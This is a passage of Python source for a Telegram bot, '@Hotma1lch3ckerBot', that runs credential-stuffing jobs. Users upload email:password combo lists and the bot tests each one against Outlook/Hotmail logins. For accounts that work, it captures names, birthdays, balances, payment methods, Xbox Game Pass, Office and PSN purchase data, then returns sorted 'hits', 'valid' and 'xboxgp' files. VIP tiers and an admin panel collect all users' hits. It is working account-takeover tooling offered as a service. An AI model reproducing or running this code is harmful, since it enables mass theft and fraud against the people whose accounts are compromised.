        psn_purchases = result_data.get("psn_purchases", []) if result_data else []

        flag = get_flag(region)
        safe_email = email.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        safe_pass = password.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

        lines = [
            "🎯 <b>NEW HIT FOUND!</b>",
            "",
            f"✉️ <code>{safe_email}:{safe_pass}</code>",
        ]

        if name and name != "N/A":
            region_part = f" | {flag} {region}" if region and region != "N/A" else ""
            lines.append(f"👤 <b>{name}</b>{region_part}")
        elif region and region != "N/A":
            lines.append(f"{flag} <b>{region}</b>")

        if birthday:
            age_str = f" (Age: {age})" if age else ""
            lines.append(f"🎂 Birthday: <b>{birthday}</b>{age_str}")

        if balance:
            lines.append(f"💰 <b>Balance: {balance}</b>")

        pay_clean = [p for p in payment_methods if p and p != "N/A"]
        if pay_clean:
            lines.append(f"💳 Payment: {' / '.join(pay_clean)}")

        subs_clean = [s for s in ms_subs if s and s != "N/A"]
        if subs_clean:
            lines.append(f"📦 MS Subs: {', '.join(subs_clean)}")

        if psn_orders:
            lines.append(f"🎮 <b>PSN Orders: {psn_orders}</b>")
            for i, p in enumerate(psn_purchases[:3], 1):
                item = p.get("item", "")
                price = p.get("price", "")
                date = p.get("date", "")
                pline = f"  {i}. {item}"
                if price:
                    pline += f" | 💰 {price}"
                if date:
                    pline += f" | 📅 {date}"
                lines.append(pline)

        premium_str = ResultManager._build_premium_str(platform_subscriptions, platform_counts)
        if premium_str:
            lines.append(f"🔥 {premium_str}")
        elif platform_counts:
            top = sorted(platform_counts.items(), key=lambda x: x[1], reverse=True)[:5]
            lines.append(f"📥 Inbox: {', '.join(f'{p}: {c}' for p, c in top)}")

        return "\n".join(lines)

    def save_hit(self, email, password, result_data):
        entry = self._format_entry(email, password, result_data)

        # hits.txt — full capture
        with open(self.hits_file, 'a', encoding='utf-8') as f:
            f.write(entry)

        # valid.txt — email:password only (no capture)
        with open(self.valid_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

        # xboxgp.txt — accounts with any Xbox Game Pass subscription
        ms_subs = result_data.get("ms_subscriptions", []) if result_data else []
        xbox_keywords = ["game pass", "gamepass", "xbox"]
        if any(any(kw in s.lower() for kw in xbox_keywords) for s in ms_subs):
            sub_label = next(
                (s for s in ms_subs if any(kw in s.lower() for kw in xbox_keywords)), ""
            )
            with open(self.xboxgp_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | {sub_label}\n")

        # per-service files inside services/
        platform_counts = result_data.get("platform_counts", {}) if result_data else {}
        for platform in platform_counts.keys():
            safe_platform = re.sub(r'[^\w\-. ]', '_', platform)
            service_file = os.path.join(self.services_folder, f"{safe_platform}_hits.txt")
            with open(service_file, 'a', encoding='utf-8') as f:
                f.write(entry)

    def save_free(self, email, password, result_data=None):
        entry = self._format_entry(email, password, result_data)
        with open(self.free_file, 'a', encoding='utf-8') as f:
            f.write(entry)


# ================= JOB CLASS =================
# Monotonic counter used to break priority ties in the PriorityQueue
_job_counter = itertools.count()


class Job:
    def __init__(self, user_id, chat_id, combo_list, filename, priority=1):
        self.user_id = user_id
        self.chat_id = chat_id
        self.combo_list = combo_list
        self.filename = filename
        self.total = len(combo_list)
        self.checked = 0
        self.hits = 0
        self.free = 0
        self.bads = 0
        self.twofa = 0
        self.errors = 0
        self.start_time = None
        self.status = "queued"
        self.last_hits = deque(maxlen=5)
        self.dashboard_msg_id = None
        self.result_manager = None
        self.priority = priority
        self.platform_totals: Dict[str, int] = {}
        self.psn_hits = 0
        self.xbox_ultimate = 0
        self.xbox_other = 0
        self.office_hits = 0
        self._seq = next(_job_counter)
        # asyncio objects created lazily inside event loop
        self._lock = None
        self._cancel_event = None

    @property
    def lock(self):
        if self._lock is None:
            self._lock = asyncio.Lock()
        return self._lock

    @property
    def cancel_event(self):
        if self._cancel_event is None:
            self._cancel_event = asyncio.Event()
        return self._cancel_event

    def __lt__(self, other):
        if self.priority != other.priority:
            return self.priority < other.priority
        return self._seq < other._seq


# ================= DASHBOARD FORMATTER =================
def format_dashboard_html(job: Job, speed=0.0, eta="--"):
    completed = (job.checked / job.total * 100) if job.total else 0
    success_rate = (job.hits / job.checked * 100) if job.checked else 0

    # Progress bar
    bar_fill = int(completed / 5)
    bar = "█" * bar_fill + "░" * (20 - bar_fill)

    last_hits_lines = []
    for email, platforms in job.last_hits:
        safe_email = email.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        plat_str = ", ".join(str(p) for p in platforms) if platforms else "?"
        last_hits_lines.append(f"  ✉️ {safe_email} | {plat_str}")
    last_hits_text = "\n".join(last_hits_lines) if last_hits_lines else "  No hits yet..."

    # Top platforms
    if job.platform_totals:
        top_plats = sorted(job.platform_totals.items(), key=lambda x: x[1], reverse=True)[:6]
        plat_lines = "  " + " | ".join(
            f"{PLATFORM_EMOJIS.get(p, '•')} {p}: {c}" for p, c in top_plats
        )
    else:
        plat_lines = "  None detected yet..."

    # Xbox / Office / PSN breakdown
    breakdown_parts = []
    if job.xbox_ultimate:
        breakdown_parts.append(f"🎮 GP Ultimate: <code>{job.xbox_ultimate}</code>")
    if job.xbox_other:
        breakdown_parts.append(f"🎮 GP Other: <code>{job.xbox_other}</code>")
    if job.office_hits:
        breakdown_parts.append(f"💼 Office/M365: <code>{job.office_hits}</code>")
    if job.psn_hits:
        breakdown_parts.append(f"🕹 PSN Orders: <code>{job.psn_hits}</code>")
    breakdown_line = ("• " + "  |  ".join(breakdown_parts) + "\n") if breakdown_parts else ""

    return (
        f"🚀 <b>LIVE CHECKER DASHBOARD</b>\n"
        f"<code>[{bar}] {completed:.1f}%</code>\n\n"
        f"📊 <b>PROGRESS</b>\n"
        f"• Checked: <code>{job.checked}/{job.total}</code>\n"
        f"• ⚡ Speed: <code>{speed:.1f} acc/s</code>  🕒 ETA: <code>{eta}</code>\n\n"
        f"⚡ <b>RESULTS</b>\n"
        f"• 🎯 HIT: <code>{job.hits}</code>  |  🆓 FREE: <code>{job.free}</code>\n"
        f"• ❌ BAD: <code>{job.bads}</code>  |  🔐 2FA: <code>{job.twofa}</code>  |  ⚠️ ERR: <code>{job.errors}</code>\n"
        f"• 📈 Hit Rate: <code>{success_rate:.1f}%</code>\n"
        f"• 🎮 GamePass: <code>{job.xbox_ultimate + job.xbox_other}</code>  (Ultimate: <code>{job.xbox_ultimate}</code> | Other: <code>{job.xbox_other}</code>)\n"
        f"{breakdown_line}\n"
        f"🏆 <b>TOP SERVICES FOUND:</b>\n{plat_lines}\n\n"
        f"🔔 <b>LAST {len(job.last_hits)} HITS:</b>\n{last_hits_text}\n\n"
        f"⏰ <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
    )


# ================= GLOBAL QUEUE & EXECUTOR =================
# Initialized in post_init to avoid creating asyncio objects outside the event loop
job_queue: Optional[asyncio.PriorityQueue] = None
user_jobs: Dict[int, Job] = {}
executor = ThreadPoolExecutor(max_workers=THREADS_PER_JOB * MAX_CONCURRENT_JOBS)


# ================= PROCESSING FUNCTIONS =================
async def update_dashboard(job: Job, bot):
    elapsed = time.time() - job.start_time if job.start_time else 0
    speed = job.checked / elapsed if elapsed > 0 else 0
    remaining = (job.total - job.checked) / speed if speed > 0 else 0
    eta = f"{int(remaining // 60)}m {int(remaining % 60)}s" if remaining else "--"

    text = format_dashboard_html(job, speed, eta)
    try:
        await bot.edit_message_text(
            chat_id=job.chat_id,
            message_id=job.dashboard_msg_id,
            text=text,
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass


async def process_job(job: Job, bot):
    job.status = "running"
    job.start_time = time.time()
    job.result_manager = ResultManager(
        combo_filename=job.filename,
        base_dir=f"{RESULT_BASE_DIR}/{job.user_id}"
    )

    hit_accounts = []
    free_accounts = []

    account_queue = asyncio.Queue()
    for email, pwd in job.combo_list:
        await account_queue.put((email, pwd))

    async def update_stats(result, email, pwd):
        async with job.lock:
            job.checked += 1
            if isinstance(result, dict) and result.get("status") == "HIT":
                job.hits += 1
                platform_counts = result.get("platform_counts", {})
                platforms_list = list(platform_counts.keys())
                job.last_hits.append((email, platforms_list))
                job.result_manager.save_hit(email, pwd, result)
                hit_accounts.append((email, pwd, result))
                user = get_user(job.user_id)
                update_user(job.user_id, {"total_hits": user["total_hits"] + 1})

                # Update live platform totals
                for plat, cnt in platform_counts.items():
                    job.platform_totals[plat] = job.platform_totals.get(plat, 0) + cnt

                # Track PSN / Xbox / Office breakdown
                if result.get("psn_orders", 0) > 0:
                    job.psn_hits += 1
                for sub in result.get("ms_subscriptions", []):
                    sub_l = sub.lower()
                    if "ultimate" in sub_l:
                        job.xbox_ultimate += 1
                    elif "game pass" in sub_l or "gamepass" in sub_l:
                        job.xbox_other += 1
                    elif "office" in sub_l or "microsoft 365" in sub_l or "m365" in sub_l:
                        job.office_hits += 1

                # Send instant hit notification
                try:
                    notif = ResultManager._format_telegram_hit(email, pwd, result)
                    await bot.send_message(
                        chat_id=job.chat_id,
                        text=notif,
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass

            elif isinstance(result, dict) and result.get("status") == "FREE":
                job.free += 1
                job.result_manager.save_free(email, pwd, result)
                free_accounts.append((email, pwd, result))
            elif result == "BAD":
                job.bads += 1
            elif result == "2FA":
                job.twofa += 1
            else:
                job.errors += 1

            if job.checked % DASHBOARD_UPDATE_INTERVAL == 0 or job.checked == job.total:
                await update_dashboard(job, bot)

    async def worker(worker_id):
        loop = asyncio.get_running_loop()
        while not job.cancel_event.is_set():
            try:
                email, pwd = await asyncio.wait_for(account_queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                break

            checker = OutlookSenderChecker()
            raw_result = await loop.run_in_executor(executor, checker.check_account, email, pwd)
            await update_stats(raw_result, email, pwd)
            account_queue.task_done()
            await asyncio.sleep(ACCOUNT_DELAY)

    workers = [asyncio.create_task(worker(i)) for i in range(THREADS_PER_JOB)]

    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        job.cancel_event.set()
        await asyncio.gather(*workers, return_exceptions=True)
        job.status = "cancelled"
    else:
        job.status = "completed"
    finally:
        await update_dashboard(job, bot)

        files_sent = []

        if hit_accounts:
            # hits.txt — full capture with all details
            hit_content = "".join(
                ResultManager._format_entry(e, p, rd if isinstance(rd, dict) else None)
                for e, p, rd in hit_accounts
            )
            hit_file = io.BytesIO(hit_content.encode())
            hit_file.name = f"@Hotma1lch3ckerBot_hits_{job.user_id}.txt"
            await bot.send_document(
                chat_id=job.chat_id,
                document=hit_file,
                caption=f"🎯 *hits.txt — Full Capture: {len(hit_accounts)} accounts*",
                parse_mode=ParseMode.MARKDOWN
            )
            files_sent.append("hits.txt")

            # valid.txt — email:password only
            valid_content = "\n".join(f"{e}:{p}" for e, p, _ in hit_accounts) + "\n"
            valid_file = io.BytesIO(valid_content.encode())
            valid_file.name = f"@Hotma1lch3ckerBot_valid_{job.user_id}.txt"
            await bot.send_document(
                chat_id=job.chat_id,
                document=valid_file,
                caption=f"✅ *valid.txt — Clean combos: {len(hit_accounts)}*",
                parse_mode=ParseMode.MARKDOWN
            )
            files_sent.append("valid.txt")

            # xboxgp.txt — Xbox Game Pass accounts only
            xbox_keywords = ["game pass", "gamepass", "xbox"]
            xbox_lines = []
            for e, p, rd in hit_accounts:
                if isinstance(rd, dict):
                    subs = rd.get("ms_subscriptions", [])
                    matched = next(
                        (s for s in subs if any(kw in s.lower() for kw in xbox_keywords)), None
                    )
                    if matched:
                        xbox_lines.append(f"{e}:{p} | {matched}\n")
            if xbox_lines:
                xboxgp_file = io.BytesIO("".join(xbox_lines).encode())
                xboxgp_file.name = f"@Hotma1lch3ckerBot_xboxgp_{job.user_id}.txt"
                await bot.send_document(
                    chat_id=job.chat_id,
                    document=xboxgp_file,
                    caption=f"🎮 *xboxgp.txt — Xbox Game Pass: {len(xbox_lines)}*",
                    parse_mode=ParseMode.MARKDOWN
                )
                files_sent.append(f"xboxgp.txt ({len(xbox_lines)})")

        if free_accounts:
            free_content = "\n".join(f"{e}:{p}" for e, p, _ in free_accounts) + "\n"
            free_file = io.BytesIO(free_content.encode())
            free_file.name = f"@Hotma1lch3ckerBot_free_{job.user_id}.txt"
            await bot.send_document(
                chat_id=job.chat_id,
                document=free_file,
                caption=f"🆓 *free.txt — Free Accounts (No Services): {len(free_accounts)}*",
                parse_mode=ParseMode.MARKDOWN
            )
            files_sent.append(f"free.txt ({len(free_accounts)})")

        # Build subscription breakdown for summary
        sub_breakdown = []
        if job.xbox_ultimate:
            sub_breakdown.append(f"  🎮 GP Ultimate: {job.xbox_ultimate}")
        if job.xbox_other:
            sub_breakdown.append(f"  🎮 GP Other: {job.xbox_other}")
        if job.office_hits:
            sub_breakdown.append(f"  💼 Office/M365: {job.office_hits}")
        if job.psn_hits:
            sub_breakdown.append(f"  🕹 PSN Orders: {job.psn_hits}")
        sub_block = ("\n" + "\n".join(sub_breakdown) + "\n") if sub_breakdown else ""

        summary = (
            f"📊 *Job Summary*\n\n"
            f"✅ HIT: {job.hits}\n"
            f"🆓 FREE: {job.free}\n"
            f"❌ BAD: {job.bads}\n"
            f"🔐 2FA: {job.twofa}\n"
            f"⚠️ Errors: {job.errors}"
            f"{sub_block}\n"
            f"📁 Files sent: {', '.join(f'`{f}`' for f in files_sent) if files_sent else 'none'}\n"
        )
        await bot.send_message(
            chat_id=job.chat_id,
            text=summary,
            parse_mode=ParseMode.MARKDOWN
        )


async def queue_worker(bot):
    while True:
        job = await job_queue.get()
        if job.status == "cancelled":
            job_queue.task_done()
            continue
        try:
            msg = await bot.send_message(
                chat_id=job.chat_id,
                text=format_dashboard_html(job),
                parse_mode=ParseMode.HTML
            )
            job.dashboard_msg_id = msg.message_id
            await process_job(job, bot)
            status_text = "✅ Job completed!" if job.status == "completed" else "❌ Job cancelled."
            await bot.send_message(chat_id=job.chat_id, text=status_text)
        except Exception as e:
            print(f"[queue_worker] Error processing job for user {job.user_id}: {e}")
            try:
                await bot.send_message(chat_id=job.chat_id, text="⚠️ An error occurred while processing your job.")
            except Exception:
                pass
        finally:
            if job.user_id in user_jobs and user_jobs[job.user_id] is job:
                del user_jobs[job.user_id]
            job_queue.task_done()


# ================= DAILY RESET =================
async def daily_reset_check():
    last_check_date = None
    while True:
        today = get_today_istanbul()
        if last_check_date != today:
            users = load_users()
            changed = False
            for uid in users:
                user = users[uid]
                if user.get("daily_stats", {}).get("date") != today.isoformat():
                    user["daily_stats"] = {"date": today.isoformat(), "files_uploaded": 0}
                    changed = True
                for field, default in [("vip_level", 0), ("total_jobs", 0), ("total_hits", 0)]:
                    if field not in user:
                        user[field] = default
                        changed = True
            if changed:
                save_users(users)
                print(f"[{datetime.now()}] Daily counters reset.")
            last_check_date = today
        await asyncio.sleep(3600)


# ================= ADMIN PANEL =================
LEVEL_NAMES = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}


def _admin_main_keyboard():
    users = load_users()
    pending = sum(1 for u in users.values() if not u.get("approved") and not u.get("banned"))
    pending_label = f"⏳ Pending ({pending})" if pending else "⏳ Pending (0)"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Dashboard", callback_data="adm_dash"),
         InlineKeyboardButton("👥 Users", callback_data="adm_users_0")],
        [InlineKeyboardButton(pending_label, callback_data="adm_pending"),
         InlineKeyboardButton("📁 All Hits", callback_data="adm_allhits")],
    ])


async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    await update.message.reply_text(
        "👑 *Admin Panel*\n\nChoose an option:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=_admin_main_keyboard()
    )


async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await query.edit_message_text("❌ Unauthorized")
        return

    data = query.data

    # ── Main menu ──────────────────────────────────────────────────────────────
    if data == "adm_home":
        await query.edit_message_text(
            "👑 *Admin Panel*\n\nChoose an option:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=_admin_main_keyboard()
        )

    # ── Dashboard ──────────────────────────────────────────────────────────────
    elif data == "adm_dash":
        users = load_users()
        total_users = len(users)
        banned_count = sum(1 for u in users.values() if u.get("banned"))
        vip_count = sum(1 for u in users.values() if u.get("vip_level", 0) > 0)
        approved_count = sum(1 for u in users.values() if u.get("approved"))
        pending_count = sum(1 for u in users.values() if not u.get("approved") and not u.get("banned"))
        total_jobs = sum(u.get("total_jobs", 0) for u in users.values())
        total_hits = sum(u.get("total_hits", 0) for u in users.values())
        files_today = sum(u.get("daily_stats", {}).get("files_uploaded", 0) for u in users.values())
        active_now = len([j for j in user_jobs.values() if j.status == "running"])

        total_result_files = 0
        if os.path.exists(RESULT_BASE_DIR):
            for root, dirs, files in os.walk(RESULT_BASE_DIR):
                total_result_files += len([f for f in files if f.endswith(".txt")])

        text = (
            f"📊 *Admin Dashboard*\n\n"
            f"👥 Total users: `{total_users}`\n"
            f"✅ Approved: `{approved_count}` | ⏳ Pending: `{pending_count}` | 🚫 Banned: `{banned_count}`\n"
            f"⭐ VIP users: `{vip_count}`\n\n"
            f"⚡ Active jobs: `{active_now}`\n"
            f"📋 Total jobs: `{total_jobs}`\n"
            f"🎯 Total hits: `{total_hits}`\n"
            f"📁 Files today: `{files_today}`\n"
            f"📚 Result files: `{total_result_files}`\n"
        )
        await query.edit_message_text(
            text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_home")]])
        )

    # ── Pending users list ────────────────────────────────────────────────────
    elif data == "adm_pending":
        users = load_users()
        pending = {uid: u for uid, u in users.items() if not u.get("approved") and not u.get("banned")}
        if not pending:
            await query.edit_message_text(
                "✅ No pending users.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_home")]])
            )
            return
        keyboard = []
        for uid, u in list(pending.items())[:20]:
            uname = u.get("username", "")
            label = f"@{uname}" if uname else f"ID {uid}"
            keyboard.append([
                InlineKeyboardButton(f"👤 {label}", callback_data=f"adm_manage_{uid}"),
                InlineKeyboardButton("✅", callback_data=f"adm_approve_{uid}"),
                InlineKeyboardButton("🚫", callback_data=f"adm_reject_{uid}"),
            ])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="adm_home")])
        await query.edit_message_text(
            f"⏳ *Pending Users ({len(pending)})*\n\nSelect a user to manage or use ✅/🚫 to approve/reject:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # ── Approve user ──────────────────────────────────────────────────────────
    elif data.startswith("adm_approve_"):
        uid = data[len("adm_approve_"):]
        update_user(int(uid), {"approved": True, "banned": False})
        try:
            await context.bot.send_message(
                chat_id=int(uid),
                text="✅ *Your access has been approved!*\n\nYou can now use the bot. Send /start to begin.",
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception:
            pass
        await _show_user_panel(query, uid, "✅ User approved and notified.")

    # ── Reject user ───────────────────────────────────────────────────────────
    elif data.startswith("adm_reject_"):
        uid = data[len("adm_reject_"):]
        update_user(int(uid), {"approved": False, "banned": True})
        try:
            await context.bot.send_message(
                chat_id=int(uid),
                text="🚫 Your access request has been rejected."
            )
        except Exception:
            pass
        await _show_user_panel(query, uid, "🚫 User rejected and banned.")

    # ── All Hits ───────────────────────────────────────────────────────────────
    elif data == "adm_allhits":
        all_hits = []
        if os.path.exists(RESULT_BASE_DIR):
            for user_dir in os.listdir(RESULT_BASE_DIR):
                user_path = os.path.join(RESULT_BASE_DIR, user_dir)
                if not os.path.isdir(user_path):
                    continue
                for job_dir in os.listdir(user_path):
                    hits_file = os.path.join(user_path, job_dir, "hits.txt")
                    if os.path.exists(hits_file):
                        with open(hits_file, "r", encoding="utf-8") as f:
                            all_hits.extend(f.readlines())
        if not all_hits:
            await query.edit_message_text("No hits found yet.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_home")]]))
            return
        hits_io = io.BytesIO("".join(all_hits).encode())
        hits_io.name = "all_hits.txt"
        await query.message.reply_document(document=hits_io, caption=f"📁 All Hits: {len(all_hits)} lines")

    # ── Find user tip ──────────────────────────────────────────────────────────
    elif data == "adm_find":
        await query.edit_message_text(
            "🔍 Use `/manage <user_id>` to open a user's management panel.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_home")]])
        )

    # ── User list (paginated) ──────────────────────────────────────────────────
    elif data.startswith("adm_users_"):
        page = int(data[len("adm_users_"):])
        users = load_users()
        uids = list(users.keys())
        page_size = 8
        start = page * page_size
        page_uids = uids[start:start + page_size]

        keyboard = []
        for uid in page_uids:
            u = users[uid]
            level = u.get("vip_level", 0)
            banned = "🚫" if u.get("banned") else ""
            label = LEVEL_NAMES.get(level, str(level))
            keyboard.append([InlineKeyboardButton(
                f"{banned}{uid} | {label} | Jobs:{u.get('total_jobs',0)} Hits:{u.get('total_hits',0)}",
                callback_data=f"adm_manage_{uid}"
            )])

        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"adm_users_{page-1}"))
        if start + page_size < len(uids):
            nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"adm_users_{page+1}"))
        if nav:
            keyboard.append(nav)
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="adm_home")])

        await query.edit_message_text(
            f"👥 *Users ({len(uids)} total) — Page {page+1}*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # ── Manage individual user ─────────────────────────────────────────────────
    elif data.startswith("adm_manage_"):
        uid = data[len("adm_manage_"):]
        await _show_user_panel(query, uid)

    # ── Set VIP level ──────────────────────────────────────────────────────────
    elif data.startswith("adm_lvl_"):
        parts = data[len("adm_lvl_"):].split("_", 1)
        uid, lvl = parts[0], int(parts[1])
        update_user(int(uid), {"vip_level": lvl})
        await _show_user_panel(query, uid, f"✅ Level set to {LEVEL_NAMES[lvl]}")

    # ── Set daily limit ────────────────────────────────────────────────────────
    elif data.startswith("adm_lim_"):
        parts = data[len("adm_lim_"):].split("_", 1)
        uid, lim = parts[0], parts[1]
        val = None if lim == "none" else int(lim)
        update_user(int(uid), {"custom_daily_limit": val})
        label = "∞ (VIP default)" if val is None else str(val)
        await _show_user_panel(query, uid, f"✅ Daily limit set to {label}")

    # ── Ban / Unban ────────────────────────────────────────────────────────────
    elif data.startswith("adm_ban_"):
        uid = data[len("adm_ban_"):]
        update_user(int(uid), {"banned": True})
        await _show_user_panel(query, uid, "🚫 User banned.")

    elif data.startswith("adm_unban_"):
        uid = data[len("adm_unban_"):]
        update_user(int(uid), {"banned": False})
        await _show_user_panel(query, uid, "✅ User unbanned.")

    # ── Reset daily count ──────────────────────────────────────────────────────
    elif data.startswith("adm_reset_"):
        uid = data[len("adm_reset_"):]
        users = load_users()
        if uid in users:
            users[uid]["daily_stats"] = {"date": get_today_istanbul().isoformat(), "files_uploaded": 0}
            save_users(users)
        await _show_user_panel(query, uid, "✅ Daily counter reset.")

    # ── User job files ─────────────────────────────────────────────────────────
    elif data.startswith("adm_files_"):
        uid = data[len("adm_files_"):]
        user_path = os.path.join(RESULT_BASE_DIR, uid)
        if not os.path.exists(user_path):
            await query.edit_message_text(f"No result files for user {uid}.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=f"adm_manage_{uid}")]]))
            return
        keyboard = []
        for job_dir in sorted(os.listdir(user_path))[-10:]:
            job_path = os.path.join(user_path, job_dir)
            if not os.path.isdir(job_path):
                continue
            hits_file = os.path.join(job_path, "hits.txt")
            hit_count = 0
            if os.path.exists(hits_file):
                with open(hits_file, "r", encoding="utf-8") as f:
                    hit_count = len(f.readlines())
            display = job_dir[:22] + ".." if len(job_dir) > 24 else job_dir
            keyboard.append([InlineKeyboardButton(
                f"📁 {display} ({hit_count} hits)",
                callback_data=f"adm_job_{uid}|{job_dir}"
            )])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data=f"adm_manage_{uid}")])
        await query.edit_message_text(
            f"📂 *Files for {uid}*", parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    # ── Send job files ─────────────────────────────────────────────────────────
    elif data.startswith("adm_job_"):
        remainder = data[len("adm_job_"):]
        uid, job_dir = remainder.split("|", 1)
        job_path = os.path.join(RESULT_BASE_DIR, uid, job_dir)
        for fname in ["hits.txt", "free.txt", "valid.txt", "xboxgp.txt"]:
            fpath = os.path.join(job_path, fname)
            if os.path.exists(fpath):
                with open(fpath, "r", encoding="utf-8") as f:
                    content = f.read()
                fio = io.BytesIO(content.encode())
                fio.name = f"{uid}_{fname}"
                await query.message.reply_document(document=fio, caption=f"📁 {fname} — user {uid}")


async def _show_user_panel(query, uid: str, notice: str = ""):
    users = load_users()
    u = users.get(uid, {})
    level = u.get("vip_level", 0)
    banned = u.get("banned", False)
    custom_lim = u.get("custom_daily_limit")
    daily_used = u.get("daily_stats", {}).get("files_uploaded", 0)
    eff_limit = custom_lim if custom_lim is not None else DAILY_FILE_LIMITS.get(level, 3)
    lim_display = "∞" if eff_limit >= 9999 else str(eff_limit)

    approved = u.get("approved", False)
    status_icon = "🚫 BANNED" if banned else ("✅ Approved" if approved else "⏳ Pending")
    uname = u.get("username", "")
    uname_str = f" (@{uname})" if uname else ""

    text = (
        f"👤 *User: `{uid}`*{uname_str}\n"
        f"Status: {status_icon}\n"
        f"Level: {LEVEL_NAMES.get(level, str(level))}\n"
        f"Daily files: `{daily_used}/{lim_display}` "
        f"{'(custom)' if custom_lim is not None else ''}\n"
        f"Total jobs: `{u.get('total_jobs', 0)}` | Hits: `{u.get('total_hits', 0)}`\n"
    )
    if notice:
        text += f"\n_{notice}_"

    keyboard = []

    if not approved and not banned:
        keyboard.append([
            InlineKeyboardButton("✅ Approve", callback_data=f"adm_approve_{uid}"),
            InlineKeyboardButton("🚫 Reject", callback_data=f"adm_reject_{uid}"),
        ])

    keyboard += [
        [
            InlineKeyboardButton("👤 Normal", callback_data=f"adm_lvl_{uid}_0"),
            InlineKeyboardButton("⭐ VIP", callback_data=f"adm_lvl_{uid}_1"),
            InlineKeyboardButton("👑 VIP+", callback_data=f"adm_lvl_{uid}_2"),
        ],
        [
            InlineKeyboardButton("📅 3/day", callback_data=f"adm_lim_{uid}_3"),
            InlineKeyboardButton("📅 10", callback_data=f"adm_lim_{uid}_10"),
            InlineKeyboardButton("📅 25", callback_data=f"adm_lim_{uid}_25"),
            InlineKeyboardButton("📅 ∞", callback_data=f"adm_lim_{uid}_9999"),
        ],
        [
            InlineKeyboardButton("🔄 Reset Daily", callback_data=f"adm_reset_{uid}"),
            InlineKeyboardButton("📁 Files", callback_data=f"adm_files_{uid}"),
        ],
        [
            InlineKeyboardButton("🚫 Ban" if not banned else "✅ Unban",
                                 callback_data=f"adm_ban_{uid}" if not banned else f"adm_unban_{uid}"),
        ],
        [InlineKeyboardButton("🔙 User List", callback_data="adm_users_0")],
    ]
    await query.edit_message_text(
        text, parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ================= BOT COMMANDS =================
async def _notify_admin_new_user(bot, user_id: int, username: str):
    for admin_id in ADMIN_IDS:
        try:
            name_str = f"@{username}" if username else f"ID: {user_id}"
            await bot.send_message(
                chat_id=admin_id,
                text=(
                    f"🔔 *New user requesting access*\n\n"
                    f"👤 {name_str}\n"
                    f"🆔 `{user_id}`"
                ),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("✅ Approve", callback_data=f"adm_approve_{user_id}"),
                        InlineKeyboardButton("🚫 Reject", callback_data=f"adm_reject_{user_id}"),
                    ]
                ])
            )
        except Exception:
            pass


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    tg_user = update.effective_user
    username = tg_user.username or ""

    is_new = str(user_id) not in load_users()
    user = get_user(user_id)

    if username and user.get("username") != username:
        update_user(user_id, {"username": username})

    if user_id in ADMIN_IDS or user.get("approved"):
        level_names = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}
        daily_files = user["daily_stats"]["files_uploaded"]
        daily_limit = get_daily_limit(user)
        limit_text = f"{daily_files}/{'∞' if daily_limit >= 9999 else daily_limit}"

        text = (
            f"👋 *Welcome!*\n\n"
            f"**Your Level:** {level_names[user['vip_level']]}\n"
            f"**Today:** {limit_text} files\n\n"
            f"📎 Upload a `.txt` file (each line: `email:password`)\n"
            f"Bot will scan for 200+ platforms\n\n"
            f"*Commands:*\n"
            f"/stats – Your statistics\n"
            f"/cancel – Cancel current job"
        )
        if user_id in ADMIN_IDS:
            text += (
                "\n\n*Admin Commands:*\n"
                "/admin – Admin Panel\n"
                "/manage `<id>` – Manage a user\n"
                "/setlevel `<id>` `<0|1|2>` – Set VIP level\n"
                "/setlimit `<id>` `<n>` – Set daily file limit\n"
                "/ban `<id>` – Ban user\n"
                "/unban `<id>` – Unban user"
            )
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(
            "⏳ *Your request is pending admin approval.*\n\n"
            "You will be notified once access is granted.",
            parse_mode=ParseMode.MARKDOWN
        )
        if is_new:
            await _notify_admin_new_user(context.bot, user_id, username)


async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)

